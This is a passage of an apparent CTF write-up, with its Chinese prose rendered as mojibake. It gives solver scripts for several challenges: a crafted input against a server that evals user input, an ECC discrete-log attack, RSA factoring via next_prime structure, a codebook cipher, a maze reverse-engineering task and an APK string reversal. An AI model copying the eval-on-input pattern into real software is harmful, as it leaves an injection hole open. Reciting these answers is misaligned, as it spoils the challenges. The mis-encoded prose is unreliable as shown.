&#x27;r&#x27;).read())print(&#x27;\\n\\n&#x27;)luck = randint(0, 2021) * random()print(luck)good = eval(b64encode(input().encode(&#x27;utf-8&#x27;)))if abs(good - luck) &lt; 1e-10: print(open(&#x27;/flag&#x27;).read())else: print(&#x27;Back luck 2021???&#x27;) å…¶å®ç®—åŠä¸ªmiscé¢˜ã€‚ ä»£ç é€»è¾‘ä¸ºï¼Œè¾“å…¥å†…å®¹ï¼Œä½¿å¾—UTF-8å­—ç¬¦ä»¥base64ç¼–ç åç»“æœä¸ç»™å®šçš„floatå€¼è¿‘ä¼¼ï¼ˆ$10^{-10}$è¯¯å·®å†…ï¼‰ã€‚ base64ç¼–ç çš„ç»“æœåŒ…å«çš„å­—ç¬¦æœ‰ABCDEFGHIJKLMNOPQRSVWXYZabcdeghiklmnopqrstuvxyz0123456789+/ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨æ•°å­—0123456789å’Œè¿ç®—ç¬¦å·+æˆ–/å‡‘å‡ºè®¡ç®—å¼æ¥è¡¨ç¤º0.1ï¼Œä»¥åŠç”¨e+æ•°å­—å‡‘å‡ºç§‘å­¦è®¡æ•°æ³•ã€‚ ç”±äºä»»æ„æµ®ç‚¹æ•°éƒ½å¯ä»¥è¡¨ç¤ºä¸º $\\sum\\limits_{i,j&lt;k}(d_i \\cdot 0.1\\cdot 10^{-j})$ï¼Œå…¶ä¸­ $d_i$ è¡¨ç¤ºç¬¬ $i$ ä½çš„æ•°å­—ï¼Œ$j$ è¡¨ç¤ºå¯¹åº”çš„æŒ‡æ•°å€¼ï¼Œå¦‚ $1.143=11 \\cdot 0.1 \\cdot 10^{0}+4 \\cdot 0.1 \\cdot 10^{-1}+3 \\cdot 0.1 \\cdot 10^{-2}$ æ ¹æ®hintï¼Œ$0.1$å¯è¡¨ç¤ºä¸º452/4520ï¼Œ$10^{-j}$å¯ä»¥è¡¨ç¤ºä¸ºe+æ•°å­—ï¼Œç³»æ•° $d_i$ å¯ä»¥å˜ä¸ºå¯¹åº”çš„é¡¹çš„å åŠ ï¼Œä»¥ $1.143$ ä¸ºä¾‹ï¼Œå³ 452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e00+452/4520e01+452/4520e01+452/4520e01+452/4520e01+452/4520e02+452/4520e02+452/4520e02 æ¥ä¸‹æ¥å¯»æ‰¾æ»¡è¶³base64ç‰¹æ€§ï¼ˆç¼–ç ï¼šæ¯3å­—ç¬¦â†’4å­—ç¬¦ï¼Œè§£ç ï¼šæ¯4å­—ç¬¦â†’3å­—ç¬¦ï¼‰å¹¶ä¸”ç¼–è§£ç ä¸€è‡´çš„e+æ•°å­—ä¸²ï¼Œæœ‰ï¼š e00+å¯¹åº”&#123;M&gt;ï¼Œe01+å¯¹åº”&#123;M~ï¼Œe04+å¯¹åº”&#123;N&gt;ï¼Œe05+å¯¹åº”&#123;N~ï¼Œe08+å¯¹åº”&#123;O&gt;ï¼Œe09+å¯¹åº”&#123;O~ï¼Œe10+å¯¹åº”&#123;]&gt;ï¼Œe11+å¯¹åº”&#123;]~ï¼Œe013å¯¹åº”&#123;Mwã€‚ å°†ç”Ÿæˆå€¼æŒ‰ä¸Šé¢å…¬å¼æ‹†è§£ï¼Œæ›¿æ¢ä¸ºå¯¹åº”ç‰¹å¾ä¸²ï¼Œncäº¤äº’ï¼š 1234567891011121314151617181920212223242526272829303132333435363738#coding=utf-8#æ³¨æ„py2å’Œpy3å…³äºfloatå€¼çš„è¾“å‡ºé•¿åº¦ä¸åŒï¼Œpy2è¾“å‡ºå€¼è¿‡çŸ­ä¼šå¯¼è‡´è¯¯å·®ä¸æ»¡è¶³è¦æ±‚ï¼Œæ­¤ç”¨py3from pwn import *from base64 import b64encoder = remote(&#x27;111.231.70.44&#x27;, 28044)r.recvuntil(&#x27;Back luck 2021???&#x27;)r.recvline()r.recvline()r.recvline()r.recvline()num = r.recvline().strip(b&#x27;.&#x27;)print(num)num = num.split(b&#x27;.&#x27;)a = int(num[0])b = num[1].decode(&#x27;utf-8&#x27;)table = &#123;&#x27;0.1/&#x27;: &#x27;ã¿ã´&#x27;, &#x27;e00+&#x27;: &#x27;&#123;M&gt;&#x27;, &#x27;e01+&#x27;: &#x27;&#123;M~&#x27;, &#x27;e04+&#x27;: &#x27;&#123;N&gt;&#x27;, &#x27;e05+&#x27;: &#x27;&#123;N~&#x27;, &#x27;e08+&#x27;: &#x27;&#123;O&gt;&#x27;, &#x27;e09+&#x27;: &#x27;&#123;O~&#x27;, &#x27;e10+&#x27;: &#x27;&#123;]&gt;&#x27;, &#x27;e11+&#x27;: &#x27;&#123;]~&#x27;, &#x27;e013&#x27;: &#x27;&#123;Mw&#x27;&#125;payload = &quot;0.1/e00+&quot;*(a*10+int(b[0]))payload += &quot;0.1/e01+&quot;*(int(b[1]))payload += &quot;0.1/e04+&quot;*(int(b[2:5]))payload += &quot;0.1/e05+&quot;*(int(b[5]))payload += &quot;0.1/e08+&quot;*(int(b[6:9]))payload += &quot;0.1/e09+&quot;*(int(b[9]))payload += &quot;0.1/e10+&quot;*(int(b[10]))payload += &quot;0.1/e11+&quot;*(int(b[11]))payload += &quot;0.1/e013&quot;data = &quot;&quot;for i in range(0, len(payload), 4): data+=table[payload[i:i+4]]print(eval(b64encode(data.encode(&#x27;utf-8&#x27;))))r.sendline(data)print(r.recvall()) å‡ºé¢˜æ€è·¯æ¥è‡ªTSG CTF 2020 - Beginnerâ€™s Miscï¼Œæ­¤é¢˜ä¸æ­¢ä¸€ç§æ–¹æ³•ï¼Œæ¬¢è¿åˆ†äº«å…¶ä»–åšæ³•ã€‚ â€‹ eccsimiscce åˆæ¢eccã€‚Be patient! hint: æ³¨æ„çœ‹ä¸€ä¸‹é¢˜ç›®åå­— 123456789101112131415161718192021222324252627282930from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytesfrom random import getrandbitsfrom secret import flagdef gen(n): g = [] while len(g) &lt; 2: r = getrandbits(128) if r &lt; n: g += [r] return g[0], g[1]pt = b&#x27;\\x00&#x27; * 6 + long_to_bytes(int(flag,2))assert len(pt) % 8 == 0o = open(&#x27;output&#x27;,&#x27;w&#x27;)n = getPrime(64) * getPrime(64)o.write(str(n) + &#x27;\\n&#x27;)a, b = gen(n)p = []E = EllipticCurve(IntegerModRing(n), [a, b^2])P = E((0, b))p += [P.xy()]for k in range(len(pt) // 8): Q = bytes_to_long(pt[8 * k : 8 * k + 8]) * P p += [Q.xy()] P = Q o.write(str(p)) ç®€å•ECDLPï¼ˆæ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰ã€‚ å°†flagäºŒè¿›åˆ¶å€¼å¯¹åº”å­—ç¬¦ä¸²åœ¨å‰é¢è¡¥å……6ä¸ª&#39;\\x00&#39;åï¼Œä»¥8ä¸ªå­—èŠ‚ä¸€ç»„é€šè¿‡ECCå€ä¹˜åŠ å¯†ï¼Œå¾—åˆ°çš„ç‚¹ $Q$ å†ä½œä¸ºä¸‹ä¸€ç»„çš„åŸºç‚¹ $P$ ç»§ç»­å€ä¹˜ï¼Œä»¥æ­¤ç±»æ¨ã€‚ ä¾æ¬¡å¯¹æ¯ä¸€ç»„æ±‚è§£ECDLPé—®é¢˜ï¼Œå³ç»™å®š2ä¸ªç´ æ•° $p,q$ çš„ä¹˜ç§¯ $n=pq$ï¼Œå·²çŸ¥ç”Ÿæˆå…ƒ $P$ å’Œç§¯ $Q=m_iP$ï¼Œæ±‚ $m_i$ã€‚ $n$ æ˜¯ä¸€ä¸ªåˆæ•°ï¼Œæ ¹æ®Elliptic Curve Discrete Log in a Composite Ringï¼Œå¯ä»¥å°†å…¶åˆ†è§£æˆæ¨¡ $p$ å’Œæ¨¡ $q$ ä¸Šçš„ä¸¤æ¡æ›²çº¿ï¼Œç„¶åå†åœ¨è¿™ä¸¤æ¡æ›²çº¿ä¸Šåˆ†åˆ«æ±‚è§£DLPï¼Œæœ€åé€šè¿‡CRTç®—æ³•å³å¯å¾—åˆ°æ¨¡ $n$ ä¸‹çš„è§£ã€‚ ç”±äºDLPçš„è¿è¡Œæ—¶é•¿å–å†³äºECCçš„å…‰æ»‘åº¦ï¼Œä¸”ç”±è¾“å‡ºçš„ç‚¹åˆ—è¡¨çŸ¥æœ‰211ä¸ª8å­—èŠ‚ä¸²ï¼Œæ€»è¿è¡Œæ—¶é—´ä¼šæ¯”è¾ƒé•¿ï¼ˆBe patientï¼‰ã€‚ è§£å‡ºæ‰€æœ‰8å­—èŠ‚ä¸²ï¼Œè¿æ¥å‘ç°æ˜¯å¾ˆé•¿çš„01ä¸²ï¼Œç»“åˆhintå‘ç°é¢˜ç›®eccsi[misc]ceé‡Œå«æœ‰miscï¼Œä¸”$(211 \\cdot 8-6)\\cdot8=13456=(2^2\\cdot29)^2$ ä¸ºå®Œå…¨å¹³æ–¹æ•°ï¼ŒçŒœæµ‹ä¸ºäºŒç»´ç ï¼Œå°†01ä¸²è½¬åŒ–ä¸ºå›¾ç‰‡æ‰«ç å¾—flagã€‚ 1234567891011121314151617181920212223242526272829303132#sagen=point=[]x1,y1=point[0]x2,y2=point[1]a=(((y2^2-y1^2)-(x2^3-x1^3))%n*inverse_mod(x2-x1,n))%nb=y1#factor(n)p=12117702104890171579q=16627969210850438723flag01=&#x27;&#x27;for i in range(1,len(point)): print(i-1,i) G=point[i-1] K=point[i] Ep=EllipticCurve(GF(p),[a,b^2]) Eq=EllipticCurve(GF(q),[a,b^2]) xp=discrete_log(Ep(K),Ep(G),operation=&#x27;+&#x27;) xq=discrete_log(Eq(K),Eq(G),operation=&#x27;+&#x27;) x=crt([ZZ(xp),ZZ(xq)],[ZZ(Ep(K).order()),ZZ(Eq(K).order())]) m=bin(x)[2:].rjust(64,&#x27;0&#x27;) print(m) flag01+=m print(flag01)#01ä¸²è½¬å›¾ç‰‡ç•¥ â€‹ å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š èœé¸¡ 9:36:27èœé¸¡ä¸Šä¼ äº†æ–‡ä»¶ æ–°å»ºæ–‡æœ¬æ–‡æ¡£.py èœé¸¡ 9:37:02key1: Do you want a DaJiBei? èœé¸¡ 9:37:61å¤§ä½¬ä»¬å¸®æˆ‘çœ‹çœ‹æˆ‘è¿™ä¸ªPythonè„šæœ¬ä¸ºä»€ä¹ˆè¿è¡Œä¸äº†å•Š hint1: æœ€ç»ˆç»“æœæ˜¯è‡ªå¸¦flagæ ¼å¼çš„ï¼Œå¯ä»¥æ®æ­¤åˆ¤æ–­ç»“æœæ˜¯å¦æ­£ç¡®ï¼Œä¸å¿…æµªè´¹æ—¶é—´å°è¯•æäº¤æ ¼å¼ hint2: ä¸ºä»€ä¹ˆè¿è¡Œç»“æœé‡Œå¥½å¥½çš„3ï¼Œä¹Ÿè¦å†™æˆå¤§å°å†™æ··ä¹±çš„æ ·å­ï¼Ÿ hint3: å¦‚æœæŸä¸ªæ–¹å‘å·²ç»æ‰¾ä¸åˆ°æ›´å¤šçš„çº¿ç´¢ï¼Œä¸å¦¨å›å¤´çœ‹çœ‹æ¥æ—¶çš„é“è·¯ hint4: æœ¬é¢˜çš„åŠ å¯†æ–¹å¼æ¥æºäºå¯¹ä»¥ä¸‹é—®é¢˜çš„æ€è€ƒï¼šå¦‚ä½•åœ¨åŒä¸€ä¸ªè½½ä½“ä¸ŠåŠ å¯†ä¸¤æ®µä¿¡æ¯ï¼Œä¸”è¯»å–å…¶ä¸­ä¸€ç§ä¿¡æ¯çš„è¿‡ç¨‹ä¼šä»¤å¦ä¸€ç§ä¿¡æ¯è¢«ç ´åï¼›å¹¶ä¸”ï¼Œå¦‚æœå‰ä¸€ç§ä¿¡æ¯çš„è¯»å–æ–¹å¼è¶³å¤Ÿæ˜¾è€Œæ˜“è§ï¼Œæ˜¯å¦å¯ä»¥åœ¨æœ‰é™çš„çŸ­æ—¶é—´å†…å°½å¯èƒ½è½¬ç§»æ³¨æ„åŠ›ï¼Œå‡å°‘éé¢„æœŸæ¥æ”¶è€…å‘ç°å¦ä¸€æ®µä¿¡æ¯çš„å¯èƒ½æ€§ï¼Ÿä¸ºäº†é™ä½éš¾åº¦ï¼Œæœ¬é¢˜åœ¨é€‰æ‹©æ¯ä¸€ç§ä¿¡æ¯çš„åŠ å¯†æ–¹å¼æ—¶ï¼Œå°½å¯èƒ½é€‰æ‹©äº†å¤æ‚åº¦è¾ƒä½çš„åšæ³•ï¼›åŒæ—¶ï¼Œå°†å…¶ä¸­ä¸€æ®µä¿¡æ¯ï¼ˆç›¸ä¿¡å¤§å®¶éƒ½å·²ç»æ‰¾åˆ°è¿™ä¸€æ®µäº†ï¼‰è®¾è®¡ä¸ºå¦ä¸€æ®µä¿¡æ¯åŠ å¯†æ–¹å¼çš„æç¤ºã€‚ hint5: 3å¯¹åº”...-- 1234567891011121314fROM CRYPTO.utIL.NuMBER IMPORT BYteS_TO_LoNG, long_TO_BYTESA_Fake_FLaG = B&#x27;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#x27;nuMBER = bYTEs_tO_long(a_FAKE_FLAG)KeY1 = B&#x27;DO yOU WAnT A DAJIBEI?&#x27;KEY1 = Bytes_to_lONG(KEY1)KEY2 = 0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481biv = 10800KEY3 = KeY2 * IVIS_THIS_rEAL_FlAG = (NUmber + kEY3) // KEy1print(long_tO_bytes(IS_THis_REAl_flag)) æ–°é¢–çš„é¢˜ç›®è®¾è®¡ï¼Œå°†çœŸæ­£ä¿¡æ¯è—äºæ˜“è¯»ä¿¡æ¯é‡Œï¼Œè§†è§‰ç¬¬ä¸€å½±å“å¤§è„‘ï¼Œæ¥æ”¶å…ˆå…¥ä¿¡æ¯ä»¥å‡å°‘å…¶ä»–ä¿¡æ¯è¢«æ³¨æ„çš„å¯èƒ½ï¼Œæœ‰ç§é¦–å› æ•ˆåº”çš„æ„å‘³ã€‚ æ ¹æ®é¢˜é¢çŸ¥çœŸæ­£çš„key1=&#39;Do you want a DaJiBei?&#39;ï¼Œä¿®æ­£é™¤&#39;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#39;å¤–çš„å­—æ¯å¤§å°å†™ï¼Œè¿è¡Œè„šæœ¬å¾—åˆ°è¾“å‡ºç»“æœä¸ºthrEE_means_3ï¼Œç»“åˆhint5çŸ¥åº”è¯¥æ˜¯æ‘©æ–¯å¯†ç ï¼Œèµ›æ—¶è¿è’™å¸¦çŒœçŒœä¸­flagï¼Œä¸‹æ¥è¯¢é—®å‡ºé¢˜è€…@cheyenneé¢„æœŸè§£ä¸ºï¼Œå°†ä»£ç å…¨æ–‡å¤§å°å†™åˆ†åˆ«è½¬æ¢ä¸º.å’Œ-åè§£å¯†å¾—flagã€‚ â€‹ å•è¡¨åŠ å¯† æ›¿æ¢å¼å¯†ç ï¼Œåˆåå–ä»£åŠ å¯†æ³•ï¼Œæ˜¯å¯†ç å­¦ä¸­æŒ‰è§„å¾‹å°†æ–‡å­—åŠ å¯†çš„ä¸€ç§æ–¹å¼ã€‚æ›¿æ¢å¼å¯†ç ä»…å¯¹æ˜æ–‡ä¸­å­—ç¬¦ç»„æˆçš„å•å…ƒè¿›è¡Œæ›¿æ¢ï¼Œä½†å¯†æ–‡ä¸­å•å…ƒçš„ä½ç½®æ²¡æœ‰æ”¹å˜ã€‚å¦‚æœæ¯ä¸€ä¸ªå­—ç¬¦ä¸ºä¸€å•å…ƒè¿›è¡ŒåŠ å¯†æ“ä½œï¼Œå°±ç§°ä¹‹ä¸ºâ€œç®€æ˜“æ›¿æ¢å¯†ç â€æˆ–â€œå•è¡¨åŠ å¯†â€ã€‚ä¸€ç§å•è¡¨åŠ å¯†çš„åšæ³•æ˜¯äº‹å…ˆçº¦å®šä¸€ä»½æ–‡æœ¬ä½œä¸ºå¯†ç æœ¬ï¼Œå¹¶æ ¹æ®æ–‡æœ¬å†…å®¹å’Œç‰¹å¾å¯¹æ˜æ–‡è¿›è¡Œæ›¿æ¢åŠ å¯†ã€‚ç”±äºå¯†ç æœ¬ä»…æä¾›ç»™éå¸¸é‡è¦çš„äººå£«ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†å¯†ç çš„å®‰å…¨æ€§ã€‚æ®ç§°ï¼Œåœ¨æˆ‘å›½å¤ä»£ï¼Œè‹å·ä¸€å¸¦çš„å½“é“ºæ›¾ç»å¤§é‡ä½¿ç”¨æ­¤ç±»å¯†ç ã€‚æ³¨æ„ï¼šå¤ä»£è‹å·å½“é“ºçš„ä¼™è®¡ä¸è®¤è¯†æ‹‰ä¸å­—æ¯ã€é˜¿æ‹‰ä¼¯æ•°å­—å’Œæ ‡ç‚¹ç¬¦å·ï¼Œæ‰€ä»¥å½“æ—¶çš„å¯†ç æœ¬ä»…ä½¿ç”¨æ±‰å­— hint1: åšé¢˜æ—¶ä¸è¦è€æ˜¯ä¸Šå¤–éƒ¨ç½‘ç«™ã€‚ hint2: å¯†ç æœ¬å¯èƒ½ä¼šåœ¨2æœˆ10æ—¥è¿›è¡Œä¸€æ¬¡è¾ƒå¤§çš„æ›´æ–°ã€‚ hint3: æƒ³ä¸€æƒ³ï¼Œé‚£ä¸ªæŠŠæ•°å­—åŠ å¯†æˆæ±‰å­—çš„æ›¿æ¢å¯†ç çš„å®è´¨æ˜¯ä»€ä¹ˆï¼Ÿ hint4: å¯†ç æœ¬ï¼šè¯·ç‚¹å‡»é¡µé¢æœ€ä¸Šæ–¹çš„VIP è‹å·ç å­+ctfshow vipé¡µå¯†ç æœ¬+å½“é“ºå¯†ç ã€‚ ç¬¬ä¸€æ­¥ï¼Œå°†wordä¸­è‹å·ç å­æ›¿æ¢ä¸ºæ•°å­—ã€‚ ç¬¬äºŒæ­¥ï¼Œåˆ°https://vip.ctf.show/ï¼Œå°†ä¸Šä¸€æ­¥æ¯è¡Œæ•°å­—æŒ‰ç…§`æ¨¡å—æ•°+è¡Œæ•°+ç¬¬å‡ ä¸ªå­—`æ–¹å¼å–å‡ºå¯¹åº”çš„å­—ã€‚ ç¬¬ä¸‰æ­¥ï¼Œæ•°æ¯ä¸ªæ±‰å­—æœ‰å¤šå°‘ç¬”ç”»å‡ºå¤´ï¼Œå°±æ˜¯è½¬åŒ–æˆ16è¿›åˆ¶çš„æ•°å­—å‡ ã€‚ æœ€åå¾—åˆ°çš„16è¿›åˆ¶ä¸²è½¬å­—ç¬¦ä¸²å³ä¸ºflagã€‚ 12345678910111213141516dic=&#123;&#x27;11&#x27;:&#x27;ä»€ä¹ˆæ˜¯ä¼šå‘˜&#x27;,&#x27;12&#x27;:&#x27;å¹³å°è‡ªå¼€é€šä»¥æ¥å‡­å€Ÿç€ä¼—å¤šä¼˜ç§€çš„åŸåˆ›é¢˜ç›®ä¸æ´»è·ƒå’Œè°çš„ç¤¾åŒºç¯å¢ƒå—åˆ°äº†å¹¿å¤§çš„ä¸€è‡´å¥½è¯„ä½†æ˜¯è¿‘å‡ &#x27;,&#x27;21&#x27;:&#x27;ä¼šå‘˜æœ‰ä»€ä¹ˆç‰¹æƒ&#x27;,&#x27;22&#x27;:&#x27;ä¼šå‘˜ç›®å‰é’ˆå¯¹å¹³å°å…¥é—¨ç³»åˆ—é¢˜ç›®å¼€é€šä¼šå‘˜åå¯ä»¥è§£é”å…¨éƒ¨é“é¢˜ç›®åŒæ—¶ç”±å¹³å°æŠ€æœ¯&#x27;,&#x27;41&#x27;:&#x27;é¢˜ç›®æœ‰å“ªäº›å†…å®¹&#x27;,&#x27;42&#x27;:&#x27;å…¥é—¨ç³»åˆ—é¢˜ç›®é‡‡ç”¨å¾ªåºæ¸è¿›çš„æ–¹å¼é€æ­¥å¼€æ”¾é¢˜æ ˆå¦‚ä¸‹&#x27;,&#x27;61&#x27;:&#x27;ä¼šå‘˜å¼€é€šä»·æ ¼&#x27;,&#x27;62&#x27;:&#x27;å¹³å°é¢˜ç›®ç»å¤§éƒ¨åˆ†éƒ½æ˜¯åŸåˆ›é¢˜ç›®å‡ºé¢˜å¸ˆå‚…ä»¬ä»˜å‡ºäº†è¾›å‹¤çš„åŠ³åŠ¨è€ƒè™‘åˆ°å­¦ä¹ çš„å¤§éƒ¨åˆ†è¿˜æ˜¯ä»¥å­¦ç”Ÿä¸ºä¸»&#x27;,&#x27;71&#x27;:&#x27;ä¼šå‘˜ä»·æ ¼å…ƒè¿˜æ˜¯æ„Ÿè§‰è´µäº†æ€ä¹ˆåŠ&#x27;,&#x27;72&#x27;:&#x27;è¿™ä¸ªç¡®å®è¿˜æ˜¯ä¸ªé—®é¢˜æ‰€ä»¥ç¬”è€…å»ºè®®ç»æµå®åŠ›ä¸å¤Ÿçš„åŒå­¦å¯ä»¥è”ç³»ä¸¤ä¸‰ä¸ªå¥½å‹åˆä¹°ä¸€ä¸ªå·ç›®å‰æ”¯ä»˜å®æ”¯æŒåˆ†æœŸå’ŒèŠ±å‘—&#x27;,&#x27;81&#x27;:&#x27;å¦‚ä½•æ”¯ä»˜å¼€é€šä¼šå‘˜&#x27;&#125;x=[613,613,613,225,613,2231,613,6239,6239,7235,4223,723,421,4223,613,6224,813,2222,4223,225,421,2231,813,2222,4223,4223,813,813,813,2222,4223,6239,6239,813,421,1219,813,2222,4223,6239,613,2231,4223,2222,6239,7249]word=&#x27;&#x27;for k in x: s=str(k) key=s[:2] index=int(s[2:]) print(index) word+=dic[key][index-1] print(word)#å¼€å¼€å¼€é’ˆå¼€ç”±å¼€ä»¥ä»¥ä¹°ä¸‹ç¡®å…¥ä¸‹å¼€å‹¤æ”¯è§£ä¸‹é’ˆå…¥ç”±æ”¯è§£ä¸‹ä¸‹æ”¯æ”¯æ”¯è§£ä¸‹ä»¥ä»¥æ”¯å…¥ç›®æ”¯è§£ä¸‹ä»¥å¼€ç”±ä¸‹è§£ä»¥èŠ±#666c61677b48346e5f4c315f44555f4775305f47614f7d â€‹ RealSimpleAlgorithm So real, so simpleâ€¦ 123456789101112131415161718from Crypto.Util.number import *from secret import flagdef findPrime(k): return k if isPrime(k) else findPrime(k+1) p = getPrime(256)q = findPrime(20210123 * p * p)r = findPrime(p * q * q)s = findPrime(p * q * r)n = p * q * r * se = 0x10001m = bytes_to_long(flag)w = open(&#x27;output&#x27;,&#x27;wb&#x27;)w.write(long_to_bytes(n))w.write(b&#x27;\\n\\n&#x27;)w.write(long_to_bytes(pow(m, e, n))) RSAç­¾åˆ°é¢˜ï¼Œè€ƒå¯Ÿnext_primeç‰¹æ€§ã€‚ æ ¹æ®ç´ æ•°å®šç†ï¼Œç´ æ•°çš„å¹³å‡é—´éš”ä¸ºï¼š$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$ï¼Œå› æ­¤å¸¸è§çš„ä¸‹ä¸€ä¸ªç´ æ•°æ¯”å½“å‰ç´ æ•°å¤§ä¸€ç‚¹ï¼Œä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500ã€‚ ç”±äºç´ æ•°é—´éš”ä¸ä¼šè¶…1500ï¼Œæ•…ï¼š $q\\approx 20210123 \\cdot p^2$ $r\\approx p \\cdot q^2 \\approx 20210123^2 \\cdot p^5$ $s \\approx p \\cdot q \\cdot r \\approx 20210123^3 \\cdot p^8$ $n \\approx p \\cdot q \\cdot r \\cdot s \\approx 20210123^6 \\cdot p^{16}$ ä»¥å¼€æ–¹å–æ•´å¾—åˆ°çš„å€¼å¼€å§‹çˆ†ç ´ $p$ ï¼Œå†åˆ†åˆ«æ±‚å‡ºå¯¹åº”çš„ $q,r,s$ï¼ŒåŸºæœ¬RSAæ“ä½œå³å¯å¾—åˆ°flagã€‚ 12345678910111213141516171819202122232425262728293031import gmpy2n=c=def cal(p): q=gmpy2.next_prime(20210123*p*p) r=gmpy2.next_prime(p*q*q) s=gmpy2.next_prime(p*q*r) return p*q*r*s def findp(p,n): print(p) while 1: nx=cal(p) if nx&lt;n: p=gmpy2.next_prime(p+1) else: return p #n ~ (20210123**6)*(p**16)approx=gmpy2.iroot(n//pow(20210123,6),16)[0]p=findp(approx,n)print(p)q=gmpy2.next_prime(20210123*p*p)r=gmpy2.next_prime(p*q*q)s=gmpy2.next_prime(p*q*r)phi=(p-1)*(q-1)*(r-1)*(s-1)d=gmpy2.invert(0x10001,phi)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) â€‹ REVERSEA-Maze-In çœŸÂ·ç­¾åˆ° è¿·å®«é¢˜ã€‚ æ³¨æ„å‡½æ•°sub_4011B0()ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596int sub_4011B0()&#123; char x; // bl@1 unsigned __int8 j; // dl@1 signed int i; // esi@2 char c; // al@3 int len; // ecx@4 unsigned int v5; // esi@19 char flag[256]; // [sp+8h] [bp-230h]@1 char input[256]; // [sp+108h] [bp-130h]@1 int data; // [sp+208h] [bp-30h]@1 int v10; // [sp+20Ch] [bp-2Ch]@1 int v11; // [sp+210h] [bp-28h]@1 int v12; // [sp+214h] [bp-24h]@1 int v13; // [sp+218h] [bp-20h]@1 int v14; // [sp+21Ch] [bp-1Ch]@1 int v15; // [sp+220h] [bp-18h]@1 int v16; // [sp+224h] [bp-14h]@1 int v17; // [sp+228h] [bp-10h]@1 int v18; // [sp+22Ch] [bp-Ch]@1 int v19; // [sp+230h] [bp-8h]@1 data = -1341248919; v10 = 1078449436; v11 = -404433706; v12 = 2107721006; v13 = 310654741; v14 = 466487083; v15 = 244438942; v16 = -1045521021; v17 = -1205263960; v18 = 136611182; v19 = 31438528; memset(flag, 0, 0x100u); memset(input, 0, 0x100u); printf_(&quot;Do you wanna play a game?\\n&quot;); printf_(&quot;Let&#x27;s play escape game where you have to find a way out. Please enter your way:&quot;); sub_401050(&quot;%s&quot;, input, 256); x = 3; j = 0; if ( strlen(input) != 34 ) goto _Failed; i = 0; do &#123; c = input[i]; switch ( c ) &#123; case &#x27;U&#x27;: len = j; if ( byte_404018[4 * (x + 8 * j)] != 1 ) goto _Failed; --j; break; case &#x27;D&#x27;: len = j; if ( byte_404019[4 * (x + 8 * j)] != 1 ) goto _Failed; ++j; break; case &#x27;L&#x27;: len = j; if ( byte_40401A[4 * (x + 8 * j)] != 1 ) goto _Failed; --x; break; default: if ( c != &#x27;R&#x27; ) goto _Failed; len = j; if ( byte_40401B[4 * (x + 8 * j)] != 1 ) goto _Failed; ++x; break; &#125; ++i; &#125; while ( i &lt; 34 ); if ( x != 4 || j != 7 ) &#123;_Failed: printf_(&quot;You&#x27;re stuck!\\n&quot;); return 0; &#125; if ( decrypt((int)flag, (int)&amp;data, len, (int)input) == -1 ) return 0; printf_(&quot;Escaped! You see the flag\\n&quot;); v5 = 0; do &#123; Sleep(0xC8u); printf_(&quot;%c&quot;, flag[v5++]); &#125; while ( v5 &lt;= 44 ); return 0;&#125; ä¿¡æ¯ï¼š è¿·å®«èµ·ç‚¹(3,0)ï¼Œç»ˆç‚¹(4,7)ï¼Œå¤§å°8*8ï¼Œåªå…è®¸å››ä¸ªæ–¹å‘é”®-ä¸Š(U)ä¸‹(D)å·¦(L)å³(R)ï¼Œæ¯ä¸ªæ ¼å­ç”±ä»£è¡¨4ä¸ªæ–¹å‘çš„4ä¸ªå­—èŠ‚æ„æˆï¼Œ1è¡¨ç¤ºå¯¹åº”æ–¹å‘é€šï¼Œ0è¡¨ç¤ºå¯¹åº”æ–¹å‘ä¸é€šï¼Œæœ€å¤§æ­¥æ•°ä¸º34ï¼Œæ±‚è·¯å¾„ã€‚ åœ¨0x404018å¤„å¯ä»¥å¯¼å‡ºè¿·å®«æ•°æ®ï¼š 1234567891011121314151600 01 00 01 00 01 01 01 00 00 01 01 01 00 01 0100 01 01 00 00 01 00 01 00 01 01 00 00 01 00 0001 00 00 00 01 00 00 01 00 00 01 01 00 01 01 0001 01 00 00 01 00 00 00 01 01 00 00 01 01 00 0000 01 00 01 00 00 01 01 00 00 01 01 01 00 01 0001 00 00 01 00 01 01 00 01 00 00 01 01 01 01 0001 00 00 01 00 01 01 00 00 01 00 01 00 00 01 0100 01 01 00 01 01 00 00 00 01 00 01 01 00 01 0000 01 00 01 01 00 01 00 01 00 00 01 00 01 01 0001 01 00 00 01 01 00 00 01 00 00 01 00 01 01 0001 01 00 00 00 01 00 01 00 00 01 01 01 00 01 0001 01 00 00 01 01 00 00 00 01 00 01 01 00 01 0001 01 00 00 01 00 00 01 00 01 01 00 00 01 00 0101 00 01 00 01 01 00 00 01 00 00 01 00 01 01 0001 00 00 01 00 00 01 01 01 00 01 00 01 00 00 0100 01 01 00 01 00 00 01 00 00 01 01 01 00 01 00 å¯åœ¨çº¸ä¸Šå¤ç°è¿·å®«ï¼Œæ­£å¸¸èµ°å‡ºè·¯å¾„ï¼Œncæäº¤å¾—flagã€‚ â€‹ Matara Okina https://ctfshow.lanzous.com/i4PQEkn6vch apkåˆ†æã€‚ jadxé€†å‘åˆ†ææºç ï¼Œæ‰¾åˆ°FlagActivityï¼Œæ ¹æ®ç»“æœå­—ç¬¦ä¸²@lgvjocWzihodmXov[EWOå’Œç®—æ³•é€†å‡ºåŸå§‹å­—ç¬¦ä¸²ï¼š 1234567891011121314151617181920ans=b&#x27;@lgvjocWzihodmXov[EWO&#x27;ans=list(ans)secret=[0]*21i=0while i&lt;len(secret)//2: j=i+1 secret[i]^=j x=len(secret)-1-i secret[x]^=j i=j for i in range(10): secret[i]=ans[i]^(i+1) 